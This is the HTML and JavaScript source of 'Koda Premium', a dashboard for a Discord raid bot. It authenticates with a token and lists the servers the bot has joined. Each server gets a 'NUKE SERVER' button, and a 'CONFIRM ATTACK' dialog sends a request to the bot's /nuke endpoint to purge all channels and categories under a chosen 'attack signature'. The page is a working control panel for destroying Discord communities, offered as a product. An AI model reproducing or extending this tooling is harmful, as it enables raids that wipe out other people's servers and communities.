<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Koda | Premium Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;900&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #8b5cf6; --bg: #09090b; --card: #18181b; --border: #27272a; --danger: #ef4444; }
        body { background: var(--bg); color: #fafafa; font-family: 'Inter', sans-serif; margin: 0; display: flex; overflow-x: hidden; }
        
        /* Sidebar */
        .sidebar { width: 280px; height: 100vh; background: var(--card); border-right: 1px solid var(--border); padding: 30px 20px; position: fixed; z-index: 100; }
        .logo { display: flex; align-items: center; gap: 12px; font-weight: 900; font-size: 1.2rem; margin-bottom: 40px; }
        .logo img { width: 35px; border-radius: 8px; }
        .nav-item { padding: 12px 15px; border-radius: 10px; color: #a1a1aa; text-decoration: none; display: flex; align-items: center; margin-bottom: 8px; transition: 0.2s; cursor: pointer; }
        .nav-item:hover, .nav-item.active { background: #27272a; color: white; }
        .nav-item.active { border-left: 4px solid var(--primary); background: rgba(139, 92, 246, 0.1); }

        /* Main Content */
        .content { margin-left: 280px; flex: 1; padding: 40px; }
        .banner { width: 100%; height: 180px; object-fit: cover; border-radius: 15px; border: 1px solid var(--border); margin-bottom: 30px; }
        
        /* Stats */
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 40px; }
        .s-card { background: var(--card); padding: 25px; border-radius: 15px; border: 1px solid var(--border); }
        .s-card h4 { margin: 0; color: #71717a; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; }
        .s-card p { margin: 10px 0 0; font-size: 2rem; font-weight: 900; color: var(--primary); }

        /* Server Grid */
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 25px; }
        .server-box { background: var(--card); border-radius: 20px; border: 1px solid var(--border); padding: 25px; transition: 0.3s; position: relative; }
        .server-box:hover { border-color: var(--primary); transform: translateY(-5px); }
        .s-head { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
        .s-head img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid #3f3f46; }

        .btn { border: none; padding: 12px; border-radius: 10px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.2s; font-size: 0.8rem; }
        .btn-nuke { background: var(--danger); color: white; margin-bottom: 12px; }
        .btn-premium { background: #27272a; color: white; width: 48%; border: 1px solid #3f3f46; }
        .btn-restore { background: var(--primary); }

        /* Modal */
        .overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.85); display:none; align-items:center; justify-content:center; z-index:1000; backdrop-filter: blur(5px); }
        .modal { background: var(--card); padding: 40px; border-radius: 20px; width: 450px; text-align: center; border: 1px solid var(--border); }

        input { background: #09090b; border: 1px solid #27272a; color: white; padding: 15px; border-radius: 10px; width: 100%; margin-bottom: 25px; outline: none; text-align: center; }
        input:focus { border-color: var(--primary); }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="logo">
            <img src="logo.png" onerror="this.src='https://i.imgur.com/vHqQWId.png'">
            KODA PREMIUM
        </div>
        <a class="nav-item active">Dashboard</a>
        <a href="https://discord.com/oauth2/authorize?client_id=1469577414022795346" target="_blank" class="nav-item">Invite Bot</a>
        <a onclick="logout()" class="nav-item" style="margin-top: 50vh; color: var(--danger);">Logout</a>
    </div>

    <div class="content">
        <img src="banner.png" class="banner" onerror="this.style.display='none'">
        
        <div class="stats">
            <div class="s-card"><h4>Servers Available</h4><p id="count">0</p></div>
            <div class="s-card"><h4>Koda Version</h4><p>2.0.4</p></div>
            <div class="s-card"><h4>Cloud Backups</h4><p id="bk-count">Active</p></div>
        </div>

        <input type="text" id="sig" placeholder="Set Attack Signature (English)...">

        <div class="grid" id="list"></div>
    </div>

    <div class="overlay" id="modal">
        <div class="modal">
            <h1 style="color:var(--danger); margin:0;">CONFIRM ATTACK</h1>
            <p style="color:#71717a; margin: 20px 0;">This will purge all channels and categories. You can restore later if you have a backup.</p>
            <div style="display:flex; gap:15px;">
                <button class="btn" style="background:#27272a; color:white;" onclick="closeM()">CANCEL</button>
                <button class="btn btn-nuke" id="confirm-btn">EXECUTE</button>
            </div>
        </div>
    </div>

    <script>
        const token = localStorage.getItem('koda_token') || new URLSearchParams(window.location.search).get('token');
        if(!token) window.location.href = 'https://koda-raid.onrender.com/login';
        else localStorage.setItem('koda_token', token);

        let target = null;

        async function init() {
            const res = await fetch('https://koda-raid.onrender.com/api/servers', { headers: { 'Authorization': `Bearer ${token}` } });
            const guilds = await res.json();
            document.getElementById('count').innerText = guilds.length;
            const list = document.getElementById('list');
            
            guilds.forEach(g => {
                const icon = g.icon ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png` : 'https://i.imgur.com/vHqQWId.png';
                list.innerHTML += `
                    <div class="server-box">
                        <div class="s-head">
                            <img src="${icon}">
                            <div><h3 style="margin:0">${g.name}</h3><small style="color:#555">${g.id}</small></div>
                        </div>
                        <button class="btn btn-nuke" onclick="openM('${g.id}')">NUKE SERVER</button>
                        <div style="display:flex; justify-content:space-between">
                            <button class="btn btn-premium" onclick="action('backup','${g.id}')">BACKUP</button>
                            <button class="btn btn-premium btn-restore" onclick="action('restore','${g.id}')">RESTORE</button>
                        </div>
                    </div>
                `;
            });
        }

        function openM(id) { target = id; document.getElementById('modal').style.display = 'flex'; }
        function closeM() { document.getElementById('modal').style.display = 'none'; }

        document.getElementById('confirm-btn').onclick = async () => {
            const sig = document.getElementById('sig').value;
            closeM();
            await fetch(`https://koda-raid.onrender.com/nuke?guildId=${target}&name=${encodeURIComponent(sig)}`);
        };

        async function action(type, id) {
            await fetch(`https://koda-raid.onrender.com/${type}?guildId=${id}`);
            alert(type.toUpperCase() + " COMPLETE");
        }

        init();
        function logout() { localStorage.removeItem('koda_token'); window.location.href = '/'; }
    </script>
</body>
</html>